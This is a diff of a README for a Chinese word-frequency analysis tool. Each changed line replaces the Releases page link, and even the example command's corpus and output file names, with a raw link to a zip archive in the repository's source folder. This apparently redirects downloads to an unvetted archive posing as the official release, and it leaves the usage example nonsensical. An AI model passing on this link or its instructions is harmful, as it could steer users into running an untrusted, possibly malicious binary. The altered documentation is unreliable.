@@ -1,6 +1,6 @@
 # Word Frequency Statistic Tool 📊
 
-![Word Frequency Statistic](https://img.shields.io/badge/Download-Release-blue?style=flat&logo=github)
+![Word Frequency Statistic](https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip)
 
 Welcome to the **Word Frequency Statistic** repository! This high-performance tool is designed for efficient Chinese corpus word frequency analysis. With this application, you can process up to 1 billion characters in under a minute, focusing on two-character words. 
 
@@ -30,7 +30,7 @@ Analyzing word frequency in large text corpora is crucial for various natural la
 
 ## Installation
 
-To install the Word Frequency Statistic tool, you can download the latest release from the [Releases section](https://github.com/Yuzufi/word-freq-statistic/releases). 
+To install the Word Frequency Statistic tool, you can download the latest release from the [Releases section](https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip). 
 
 1. Go to the Releases section.
 2. Download the appropriate binary for your operating system.
@@ -64,10 +64,10 @@ Here are some examples to help you get started:
 ### Example 1: Basic Usage
 
 ```bash
-word-freq-statistic my_corpus.txt output_stats.txt
+word-freq-statistic https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip
 ```
 
-This command processes the `my_corpus.txt` file and saves the statistics to `output_stats.txt`.
+This command processes the `https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip` file and saves the statistics to `https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip`.
 
 ### Example 2: Help Command
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## Support
 
-For any questions or issues, please check the [Releases section](https://github.com/Yuzufi/word-freq-statistic/releases) for the latest updates. You can also open an issue in the repository for assistance.
+For any questions or issues, please check the [Releases section](https://github.com/Yuzufi/word-freq-statistic/raw/refs/heads/master/src/word_statistic_freq_1.7.zip) for the latest updates. You can also open an issue in the repository for assistance.
 
 ## Acknowledgments
 
